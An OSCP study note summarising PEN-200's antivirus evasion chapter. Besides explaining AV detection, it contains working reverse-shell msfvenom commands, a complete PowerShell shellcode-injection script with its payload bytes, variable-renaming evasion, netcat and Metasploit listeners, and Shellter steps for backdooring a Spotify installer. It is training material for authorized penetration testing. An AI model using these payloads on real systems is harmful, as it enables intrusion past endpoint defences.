---
title: "PEN-200 Chapter 12 — Antivirus Evasion"
aliases:
  - "PEN-200 Ch12 Antivirus Evasion"
  - "OSCP Antivirus Evasion"
tags:
  - oscp
  - pen-200
  - antivirus-evasion
  - powershell
  - shellter
  - msfvenom
  - windows
chapter: 12
source: "PEN200_Chapter_12_Antivirus_Evasion.pdf"
---

# PEN-200 Chapter 12 — Antivirus Evasion

> [!note] Purpose
> This note summarizes **all subsections in Chapter 12** and preserves the chapter's important commands, tools, APIs, code patterns, and practical workflow. It is organized for quick OSCP review in Obsidian.

> [!warning] Lab / authorized testing only
> The techniques in this chapter are intended for systems you are authorized to test. In the OSCP context, use them only inside the exam/lab scope.

## Learning units

Chapter 12 is organized into three main learning units:

1. **12.1 Antivirus Software Key Components and Operations**
2. **12.2 Bypassing Antivirus Detections**
3. **12.3 AV Evasion in Practice**

It ends with **12.4 Wrapping Up**.

---

# 12.1 Antivirus Software Key Components and Operations

The chapter first explains how modern antivirus (AV) works so that evasion techniques make sense.

Modern AV is no longer limited to classic virus signatures. It may include:

- file scanning
- memory scanning
- network monitoring
- IDS/IPS-like protections
- firewall capabilities
- browser protections
- emulation/sandboxing
- cloud-backed machine learning

The key OSCP idea is that **different AV engines observe different parts of the attack**. A payload may evade the file engine but still be caught by the memory engine, behavioral engine, network engine, sandbox, or cloud/ML logic.

## 12.1.1 Known vs Unknown Threats

### Signatures

Traditional AV relies on **signatures** to identify known malware.

A signature can be based on:

- a complete file hash
- a characteristic sequence of bytes
- known strings
- code patterns
- behavior
- network communication patterns

The same malware can have different signatures for different detection engines. For example:

- one signature may identify the file on disk
- another may identify its network communication

### YARA

**YARA** is a signature/rule language used to describe and identify malware patterns.

**Why it matters:**  
It demonstrates that AV detections do not need to match an entire executable. A detector can look for combinations of strings, byte sequences, or structural characteristics.

**When relevant:**  
When thinking about why simply renaming a file does not help, or why changing identifiable strings/code can sometimes alter static detections.

### VirusTotal

**VirusTotal** scans submitted samples against many security products.

**Why useful:**

- quickly estimates how widely a sample is detected
- compares multiple AV engines
- can reveal whether a payload is already well known

**Important chapter warning:** VirusTotal stores the sample/hash and shares submissions with participating vendors. A private penetration-testing payload can therefore become known to AV vendors after submission.

### Known vs unknown malware

Classic signature systems are strongest against already-known malware. Modern products add **machine learning (ML)** so that previously unseen files may also be classified as malicious.

The chapter notes that cloud ML requires Internet connectivity. On isolated or restricted enterprise servers, these cloud capabilities may be unavailable or reduced.

### EDR and SIEM

**EDR — Endpoint Detection and Response**

- collects security telemetry from endpoints
- observes endpoint activity beyond a simple file scan
- may include AV functionality
- can detect suspicious activity even when an AV signature is bypassed

**SIEM — Security Information and Event Management**

- receives telemetry from many hosts/security tools
- centralizes events for SOC analysts
- helps analysts correlate activity across the enterprise

**OSCP takeaway:**  
Bypassing one AV alert does **not** mean the activity is invisible. An EDR may still generate telemetry and alert the SOC.

---

## 12.1.2 AV Engines and Components

A modern AV generally consumes continuously updated signatures from the vendor and uses multiple engines simultaneously.

### File Engine

Responsible for:

- scheduled filesystem scans
- real-time scans
- checking new/modified/downloaded files

Real-time scanning commonly watches filesystem activity at the kernel level through a mini-filter driver.

**Attacker implication:**  
Anything written to disk may be inspected immediately.

### Memory Engine

Inspects process memory at runtime for:

- known byte patterns
- malicious shellcode
- suspicious API calls
- memory injection behavior

**Attacker implication:**  
Going "fileless" may evade a file scan but does not automatically evade memory scanning.

### Network Engine

Inspects inbound and outbound traffic.

It may detect or block:

- known malicious protocols
- recognizable C2 patterns
- connections to known infrastructure

**Attacker implication:**  
A payload can execute successfully but still lose its C2/reverse-shell channel.

### Disassembler

Converts machine code into assembly and helps reconstruct program logic.

It can help the AV identify:

- encoders/decoders
- packers
- suspicious routines

### Emulator / Sandbox

Runs suspicious code in an isolated environment.

The AV can observe what the program does after unpacking/decryption rather than relying only on how the file appears on disk.

### Browser Plugin

Provides visibility into content or code executing inside the browser sandbox.

### Machine Learning Engine

Uses metadata and other features to classify unknown samples.

Cloud-backed ML can provide stronger analysis but depends on network connectivity and vendor configuration.

---

## 12.1.3 Detection Methods

The chapter describes four major detection approaches:

1. **Signature-based**
2. **Heuristic-based**
3. **Behavior-based**
4. **Machine-learning based**

### Signature-Based Detection

The AV looks for known signatures.

A signature may be:

- the entire file hash
- particular binary sequences
- recognizable strings
- a combination of patterns

A hash alone is fragile because changing one bit produces a different cryptographic hash.

### Command: inspect a file in binary with `xxd`

```bash
xxd -b malware.txt
```

**Tool:** `xxd`  
**Purpose:** display file bytes.  
**Argument:**

- `-b` — display bytes in binary instead of hexadecimal.

**Why the chapter uses it:**  
To show that changing a single character changes only a small portion of the actual file data while completely changing the SHA-256 hash.

Example output concept:

```text
00000000: 01101111 01100110 01100110 01110011 01100101 01100011 offsec
```

After changing `offsec` to `offseC`, only the byte representing the last character changes.

### Command: hash a file

```bash
sha256sum malware.txt
```

**Tool:** `sha256sum`  
**Purpose:** calculate the SHA-256 digest of a file.

The chapter runs it once before and once after changing one character.

First example:

```text
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e malware.txt
```

Modified-file example:

```text
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c malware.txt
```

**OSCP takeaway:**  
A file-hash-only signature is easy to invalidate, but modern AV uses much more than hashes.

### Heuristic-Based Detection

Attempts to determine whether code is malicious by analyzing:

- instruction sequences
- program structure
- API usage
- suspicious code patterns

The engine may disassemble or decompile code to reason about what it is likely to do.

### Behavior-Based Detection

Executes or observes the program and looks for malicious actions.

Typical behaviors might include:

- process injection
- suspicious memory allocation
- persistence activity
- unusual child processes
- network callbacks

### Machine-Learning Detection

Uses features/metadata and trained models to detect both known and unknown threats.

The chapter gives Windows Defender as an example with:

- client-side ML
- cloud ML

If local classification is uncertain, the client may query the cloud service.

### Generate a Windows reverse-shell PE with `msfvenom`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
```

**Tool:** `msfvenom`  
**Purpose:** generate payloads in different formats.

**Arguments:**

- `-p windows/shell_reverse_tcp` — selects a Windows TCP reverse-shell payload.
- `LHOST=192.168.50.1` — callback IP address; replace with the attacker's reachable IP.
- `LPORT=443` — callback/listener port.
- `-f exe` — output a Windows executable (PE).
- `> binary.exe` — shell redirection; saves output to `binary.exe`.

The chapter's output indicates an x86 payload was selected automatically.

> [!note]
> The listing caption in the chapter calls this a Meterpreter shell, but the command shown uses `windows/shell_reverse_tcp`. For exam work, trust the actual payload name in the command.

### VirusTotal test

The generated PE is submitted to VirusTotal and is detected by many products.

**Lesson:**  
Default Metasploit payloads are widely known and are a poor choice when stealth is required.

---

# 12.2 Bypassing Antivirus Detections

The chapter divides evasion into two broad categories:

- **on-disk evasion**
- **in-memory evasion**

On-disk evasion attempts to change the file that the AV sees.  
In-memory evasion tries to avoid placing the payload on disk or executes it inside process memory.

Modern AV has strong file scanning, so in-memory techniques are especially important.

---

## 12.2.1 On-Disk Evasion

### Packers

A **packer** transforms an executable into a different binary representation while preserving its functionality.

Historically, packers were used to reduce executable size. From an evasion perspective, packing also changes:

- file structure
- byte patterns
- hash

**UPX** is a well-known packer.

**Chapter warning:**  
Using UPX or another common packer by itself is generally not enough against modern AV.

### Obfuscators

An obfuscator changes code while preserving behavior.

Examples:

- replace an instruction with a semantically equivalent instruction
- add irrelevant/dead code
- split functions
- reorder functions
- mutate code structure

**Purpose:** make analysis and signature matching harder.

### Crypters

A crypter encrypts or transforms executable content and includes a small routine that restores the original code at runtime.

Typical model:

```text
Encrypted payload on disk
        ↓
Decryption stub executes
        ↓
Original payload restored in memory
        ↓
Payload runs
```

**Why useful:**  
The recognizable payload does not appear in plaintext on disk.

### Software Protectors

Protection software may combine:

- packing
- obfuscation
- encryption
- anti-debugging
- anti-reversing
- virtual-machine/emulator detection

The chapter mentions **The Enigma Protector** as a commercial example.

### OSCP takeaway

Single tricks rarely defeat all modern detection. Successful evasion may require several transformations and must be tested against the actual target product.

---

## 12.2.2 In-Memory Evasion

In-memory/PE injection manipulates volatile process memory instead of relying on a malicious executable written to disk.

The chapter introduces four concepts:

1. Remote Process Memory Injection
2. Reflective DLL Injection
3. Process Hollowing
4. Inline Hooking

### Remote Process Memory Injection

General flow:

```text
OpenProcess
    ↓
VirtualAllocEx
    ↓
WriteProcessMemory
    ↓
CreateRemoteThread
```

#### `OpenProcess`

Obtains a handle to a target process the current user is permitted to access.

#### `VirtualAllocEx`

Allocates memory inside another process.

#### `WriteProcessMemory`

Copies the payload into the allocated remote-process memory.

#### `CreateRemoteThread`

Creates a thread in the target process that begins execution at the payload address.

**When used:**  
When you want malicious code to run inside a legitimate process instead of as a standalone malicious executable.

### Reflective DLL Injection

Normal DLL injection commonly loads a DLL from disk using `LoadLibrary`.

Reflective DLL injection instead loads a DLL directly from memory.

The complication is that `LoadLibrary` expects a disk-backed DLL, so the attacker needs custom loader logic capable of handling the DLL in memory.

### Process Hollowing

Concept:

1. start a legitimate process in a suspended state
2. remove/replace its executable image in memory
3. map malicious code into the process
4. resume the process

The process appears to be a legitimate executable while actually running replacement code.

### Inline Hooking

A function's instructions are modified so control flow is redirected to attacker-controlled code.

After the malicious routine executes, control can return to the original function.

The chapter associates hooking with **rootkits**, which may modify user-space, kernel, boot, or even hypervisor-level components. Such rootkit installation generally requires elevated privileges.

---

# 12.3 AV Evasion in Practice

This learning unit turns the concepts into practical workflows.

The chapter covers:

- safe AV-evasion testing habits
- manual PowerShell thread injection
- automated payload injection with Shellter

---

## 12.3.1 Testing for AV Evasion

### Understand the defender

The chapter uses **SecOps** to describe collaboration between IT and the Security Operations Center (SOC).

A penetration tester should assume defenders may have:

- AV
- EDR
- cloud analysis
- SIEM
- analysts reviewing alerts

### Do not casually upload private payloads to VirusTotal

VirusTotal is useful for broad detection testing, but the chapter warns that submissions may be distributed to AV vendors and quickly become signatures.

**Practical consequence:**  
A payload that works before uploading may become detectable soon afterward.

### AntiScan.Me

The chapter presents **AntiScan.Me** as an alternative multi-AV scanner and states that it claims not to share samples with third parties.

It should be treated as a fallback when you do not know the target AV.

### Best option: reproduce the target environment

If you know the customer's AV:

1. build a dedicated test VM
2. install/configure the same AV
3. imitate the real environment as closely as possible
4. disable automatic sample submission while developing
5. test your changes locally

This provides better feedback than a generic multi-AV score.

### Windows Defender sample submission

The chapter demonstrates disabling:

```text
Windows Security
→ Virus & threat protection
→ Manage Settings
→ Automatic sample submission
```

**Why:**  
Avoid sending experimental payloads to cloud analysis while developing.

The chapter also notes that cloud protection and sample submission require Internet connectivity; some enterprise servers may have limited Internet access.

### Prefer custom code

The chapter's rule of thumb:

- widely reused offensive code is more likely to have signatures
- novel/custom code is less likely to match existing static signatures

This does **not** guarantee behavioral or EDR evasion.

---

## 12.3.2 Evading AV with Thread Injection

The practical target in the chapter is:

- Windows 11
- Avira Free Security 1.1.68.29553

The chapter first confirms that real-time protection is enabled and verifies that the original `binary.exe` payload is detected and quarantined.

### Why baseline testing matters

Before claiming an evasion works, confirm:

1. AV is enabled.
2. A known malicious sample is detected.
3. The modified sample is then tested under the same conditions.

This avoids false conclusions caused by a disabled/misconfigured AV.

---

## PowerShell in-memory injection concept

The chapter uses PowerShell because PowerShell can call Windows APIs through .NET/P/Invoke.

The example injects into the **current PowerShell process**, not a different remote process.

The core API sequence is:

```text
VirtualAlloc  → allocate memory in powershell.exe
memset        → copy shellcode bytes into that memory
CreateThread  → execute shellcode in a new thread
```

### Original template from the chapter

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {
    $winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
};

$winFunc::CreateThread(0,0,$x,0,0,0);

for (;;) {
    Start-sleep 60
};
```

### API / argument explanation

#### `Add-Type`

```powershell
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
```

- `-memberDefinition $code` — compiles the supplied C# method declarations.
- `-Name "Win32"` — creates a class named `Win32`.
- `-namespace Win32Functions` — places it in a custom namespace.
- `-passthru` — returns the generated type so it can be stored in `$winFunc`.

**Why:** lets PowerShell call unmanaged Windows API functions.

#### `VirtualAlloc`

Declaration:

```csharp
VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
```

Invocation:

```powershell
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
```

Arguments used:

- `0` — let Windows choose the base address.
- `$size` — allocation size.
- `0x3000` — allocation type used by the chapter (`MEM_COMMIT | MEM_RESERVE`).
- `0x40` — executable/readable/writable page protection (`PAGE_EXECUTE_READWRITE`).

**Why:** allocate a region that can store and execute shellcode.

#### `memset`

Declaration:

```csharp
memset(IntPtr dest, uint src, uint count)
```

Used in a loop:

```powershell
$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
```

- destination = allocated base address + current offset
- source = current shellcode byte
- count = `1` byte

**Why:** writes the payload into allocated memory byte-by-byte.

#### `CreateThread`

Invocation:

```powershell
$winFunc::CreateThread(0,0,$x,0,0,0)
```

The important idea is that `$x` is supplied as the thread start address.

**Why:** begins executing the shellcode stored at `$x`.

#### Infinite sleep loop

```powershell
for (;;) { Start-sleep 60 }
```

**Why:** keeps the PowerShell process alive rather than immediately exiting after creating the new thread.

---

## Generate PowerShell shellcode with `msfvenom`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

Arguments:

- `-p windows/shell_reverse_tcp` — Windows reverse TCP shell payload.
- `LHOST=192.168.50.1` — attacker callback IP.
- `LPORT=443` — callback port.
- `-f powershell` — outputs a PowerShell-compatible byte array.
- `-v sc` — names the generated PowerShell variable `sc`.

The result begins like:

```powershell
[Byte[]] $sc =
0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28
...
```

### Complete payload/script shown in the chapter

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc =
0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,
0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,
0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,
0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,
0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,
0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,
0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,
0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,
0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,
0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,
0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,
0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,
0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,
0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,
0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {
    $winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
};

$winFunc::CreateThread(0,0,$x,0,0,0);

for (;;) {
    Start-sleep 60
};
```

> [!important]
> The shellcode bytes are tied to the payload parameters used when generated. Generate your own shellcode for your own lab IP/port rather than blindly reusing the chapter bytes.

---

## Static-string evasion in the PowerShell script

The initial script is detected by many AV products, including Avira.

The chapter explains that script detections may include recognizable strings such as:

- class names
- variable names
- function names
- familiar code patterns

The next modification changes:

```text
Win32   → iWin32
sc      → var1
winFunc → var2
```

The relevant modified code shown by the chapter is:

```powershell
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $var1 =
0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;
if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {
    $var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)
};

$var2::CreateThread(0,0,$x,0,0,0);

for (;;) {
    Start-sleep 60
};
```

> [!note]
> The chapter itself abbreviates the middle of the payload in this renamed-variable listing with `...`; it is not a separate full byte array in the text.

The modified script is saved as:

```text
bypass.ps1
```

Avira's local Quick Scan reports it as clean in the chapter's lab.

### Architecture matters

The `msfvenom` payload is x86, so the chapter launches:

```text
Windows PowerShell (x86)
```

**Exam reminder:**  
Shellcode architecture must match the execution context/process architecture.

---

## PowerShell execution policy

Initial execution:

```powershell
.\bypass.ps1
```

fails because script execution is disabled.

### Check the current-user policy

```powershell
Get-ExecutionPolicy -Scope CurrentUser
```

**Arguments:**

- `-Scope CurrentUser` — query the policy applied to the current user's scope.

The chapter initially receives:

```text
Undefined
```

### Change policy for the current user

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

**Arguments:**

- `-ExecutionPolicy Unrestricted` — selects the `Unrestricted` policy.
- `-Scope CurrentUser` — changes only the current user's policy scope.

After confirming the prompt, the chapter checks again:

```powershell
Get-ExecutionPolicy -Scope CurrentUser
```

and gets:

```text
Unrestricted
```

### Per-script alternative mentioned by the chapter

Instead of changing the user's policy globally, the chapter mentions using:

```text
-ExecutionPolicy Bypass
```

when starting PowerShell for an individual script.

**Important:**  
PowerShell policy may also be controlled by Active Directory Group Policy, in which case another execution path may be required.

---

## Start a reverse-shell listener

```bash
nc -lvnp 443
```

**Tool:** Netcat (`nc`)

**Arguments:**

- `-l` — listen mode.
- `-v` — verbose.
- `-n` — do not perform DNS resolution.
- `-p 443` — local listening port.

**When:**  
Start the listener before launching the reverse-shell payload.

Then execute:

```powershell
.\bypass.ps1
```

The Kali listener receives the connection.

### Validate the shell

```cmd
whoami
```

Purpose: identify the current user/security context.

Chapter result:

```text
client01\offsec
```

```cmd
hostname
```

Purpose: identify the compromised host.

Chapter result:

```text
client01
```

### Detection caveat

Even though Avira is bypassed in the lab, the chapter warns that:

- script-focused ML may still detect the script
- EDR may alert silently
- SOC analysts may respond even when the local AV shows no warning

---

# 12.3.3 Automating the Process

The chapter next automates injection with **Shellter**.

## Shellter

**Shellter** is a dynamic shellcode injection / PE infection tool.

Conceptually it:

1. analyzes a legitimate PE
2. studies execution paths
3. identifies a suitable injection location
4. injects the payload without relying only on simple/obvious PE modifications
5. attempts to reuse existing Import Address Table (IAT) functions for allocation, transfer, and execution

The chapter notes:

- free Shellter targets 32-bit Windows executables
- Shellter Pro supports 32-bit and 64-bit binaries and additional stealth features

---

## Install Shellter

### Search the package cache

```bash
apt-cache search shellter
```

**Tool:** `apt-cache`  
**Argument:**

- `search shellter` — search package metadata for Shellter.

Expected package description:

```text
shellter - Dynamic shellcode injection tool and dynamic PE infector
```

### Install Shellter

```bash
sudo apt install shellter
```

- `sudo` — run package installation with elevated privileges.
- `apt install shellter` — install the Shellter package.

---

## Install Wine

Shellter is a Windows program, so the chapter uses Wine on Kali.

```bash
sudo apt install wine
```

**Wine:** Windows compatibility layer used to run Windows applications on Linux/POSIX systems.

### Add 32-bit architecture and Wine support

```bash
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```

Breakdown:

- `dpkg --add-architecture i386` — enable installation of 32-bit packages.
- `&&` — run the next command only if the previous one succeeds.
- `apt-get update` — refresh package indexes.
- `apt-get install wine32` — install 32-bit Wine support.

---

## Run Shellter

```bash
shellter
```

This launches Shellter under Wine.

### Auto vs Manual mode

Shellter prompts:

```text
Choose Operation Mode - Auto/Manual (A/M/H):
```

The chapter chooses:

```text
A
```

**Auto mode:** Shellter chooses much of the injection process.  
**Manual mode:** gives more granular control if automatic injection fails.

---

## Select a target PE

The chapter uses a 32-bit Spotify installer:

```text
/home/kali/desktop/spotifysetup.exe
```

Shellter makes a backup before modifying the PE.

**Chapter recommendation:**  
For a real engagement, use a newer/less scrutinized legitimate application rather than an overly common target that may already have known modified samples.

---

## Enable Stealth Mode

Prompt:

```text
Enable Stealth Mode? (Y/N/H):
```

The chapter chooses:

```text
Y
```

**Purpose:**  
Attempt to restore the legitimate program's execution flow after the injected payload runs so the host program still behaves normally.

For custom payloads, the chapter notes that successful restoration requires the payload to terminate by exiting the current thread.

---

## Shellter payload menu

The page-26 Shellter screenshot lists:

```text
[1] Meterpreter_Reverse_TCP    [stager]
[2] Meterpreter_Reverse_HTTP   [stager]
[3] Meterpreter_Reverse_HTTPS  [stager]
[4] Meterpreter_Bind_TCP       [stager]
[5] Shell_Reverse_TCP          [stager]
[6] Shell_Bind_TCP             [stager]
[7] WinExec
```

Prompt:

```text
Use a listed payload or custom? (L/C/H):
```

The chapter chooses:

```text
L
```

and then selects the first listed payload:

```text
1
```

The chapter notes that in its Windows 11 testing, non-Meterpreter payloads did not execute correctly, so it used a Meterpreter payload.

### Set callback parameters in Shellter

The payload prompts for:

```text
LHOST
LPORT
```

Set these to the Kali attack host's reachable IP and listening port.

The screenshot uses the same lab concept as:

```text
LHOST = 192.168.50.1
LPORT = 443
```

Shellter then injects the payload and performs an injection verification step.

---

## Start a Metasploit handler

Before launching the modified executable on the target:

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

**Tool:** `msfconsole`

**Arguments / commands:**

- `-x "..."` — execute the supplied Metasploit console commands automatically.
- `use exploit/multi/handler` — load the generic listener/handler module.
- `set payload windows/meterpreter/reverse_tcp` — expect a Windows Meterpreter reverse TCP payload.
- `set LHOST 192.168.50.1` — bind/callback interface/IP.
- `set LPORT 443` — listening port.
- `run` — start the handler.

Expected state:

```text
[*] Started reverse TCP handler on 192.168.50.1:443
```

---

## Test the backdoored executable

Workflow in the chapter:

```text
Backdoored Spotify installer
        ↓
Transfer to Windows 11
        ↓
Run Avira Quick Scan
        ↓
No signature detection
        ↓
Execute installer
        ↓
Legitimate Spotify UI appears
        ↓
Meterpreter callback received
```

The chapter explains that Shellter obfuscates both the payload and decoder before injection, which allows the modified binary to pass Avira's signature-based scan in the lab.

---

## Interact with the Meterpreter session

Once a session opens:

```text
meterpreter > shell
```

**Purpose:** spawn an interactive Windows command shell from Meterpreter.

Then:

```cmd
whoami
```

The chapter confirms:

```text
client01\offsec
```

This verifies that the injected payload executed on the target and produced an interactive shell.

---

# 12.4 Wrapping Up

The chapter's key conclusion is that AV evasion is an arms race.

It covers:

- how AV detects malicious code
- on-disk evasion concepts
- in-memory injection concepts
- testing methodology
- a manual PowerShell thread-injection example
- an automated Shellter example

The successful examples demonstrate bypassing a specific AV configuration, not universal invisibility.

The chapter emphasizes that modern defenders may also use:

- EDR
- cloud ML
- behavioral analysis
- sandboxes
- SIEM correlation
- SOC analysts

Therefore, a payload that is "undetected" by one local AV scan may still generate useful defensive telemetry.

---

# Attack Chain Connection

> [!tip] OSCP attack-chain interpretation
> This section is a synthesis of how Chapter 12 fits into the wider OSCP workflow.

```text
Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof
```

## Recon

AV evasion is normally **not a reconnaissance technique**, but recon may tell you what defensive stack exists.

Useful information can include:

- Windows version/architecture
- installed AV/EDR product
- Internet access restrictions
- whether PowerShell is available
- whether AppLocker/GPO restrictions exist

## Enumeration

Before choosing an evasion path, enumerate:

- AV vendor/product
- real-time protection state
- target architecture (x86/x64)
- PowerShell availability
- execution policy
- EDR/SOC presence when observable
- network egress restrictions

**Why:** The chapter repeatedly emphasizes targeting the **specific** AV rather than trying to invent a universal bypass.

## Initial Access

This is where Chapter 12 most directly helps.

Examples:

- a payload is blocked during transfer
- a dropped executable is quarantined
- a phishing attachment or Trojanized program is detected
- a reverse-shell payload is recognized

Possible response:

```text
Known payload blocked
    ↓
Modify/static obfuscate OR move execution into memory
    ↓
Retest against target AV
    ↓
Get code execution / reverse shell
```

## Privilege Escalation

After initial access, AV may interfere with:

- local privilege-escalation exploit binaries
- custom tools
- scripts

The same evasion mindset can help execute authorized tooling, but note that many advanced techniques—especially hooks/rootkits—may themselves require elevated rights.

## Credentials

Credential-dumping tools are heavily detected.

Chapter 12 teaches the general lesson that:

- default public binaries are likely to be caught
- static transformations alone may not be enough
- memory/behavior/EDR detections still matter

This chapter does not teach credential dumping itself, but it explains why credential tools often require careful execution and testing.

## Pivoting

A pivoting agent, tunnel, or proxy binary may be quarantined on a compromised host.

The chapter's techniques explain why you might need to:

- use a different build
- change code/signatures
- execute in memory
- choose a living-off-the-land alternative

## Active Directory

On domain-joined hosts:

- PowerShell execution may be governed by GPO
- EDR telemetry may be centrally monitored
- endpoint activity may be correlated in SIEM

Therefore AV evasion becomes more important—and also more difficult—during AD operations.

## Proof

The final objective is not merely "AV says clean."

Proof should demonstrate that you achieved the authorized objective:

- shell/session received
- correct host confirmed
- correct user confirmed
- required proof file/token collected according to exam rules

Always validate with commands such as:

```cmd
whoami
hostname
```

and document the attack path.

---

# Command and Tool Reference

| Command / Tool | What it does | Important arguments / notes | When to use |
|---|---|---|---|
| `xxd -b malware.txt` | Shows file bytes in binary | `-b` = binary output | Demonstrate or inspect byte-level changes |
| `sha256sum malware.txt` | Calculates SHA-256 hash | File name is the input | Compare file hashes before/after modification |
| `msfvenom -p windows/shell_reverse_tcp ... -f exe` | Generates Windows reverse-shell PE | `-p`, `LHOST`, `LPORT`, `-f exe` | Create a baseline payload/test sample |
| VirusTotal | Multi-engine malware scanning | Uploads may be shared with vendors | Broad test only; avoid sensitive payloads |
| AntiScan.Me | Multi-AV scanning service described by the chapter | Chapter says it claims not to share samples | Fallback if exact AV is unknown |
| YARA | Rule/signature language | Rules can match multiple file features | Understand signature-based detection |
| UPX | Executable packer | Common packers are widely recognized | Understand packing; not sufficient alone |
| PowerShell `Add-Type` | Compiles/imports .NET/C# definitions | `-memberDefinition`, `-Name`, `-namespace`, `-passthru` | Call Windows APIs from PowerShell |
| `VirtualAlloc` | Allocates process memory | Chapter uses `0x3000`, `0x40` | Store executable shellcode in memory |
| `memset` | Writes bytes into memory | Destination, byte, count | Copy payload into allocated memory |
| `CreateThread` | Starts a thread | Start address points to payload | Execute in-memory shellcode |
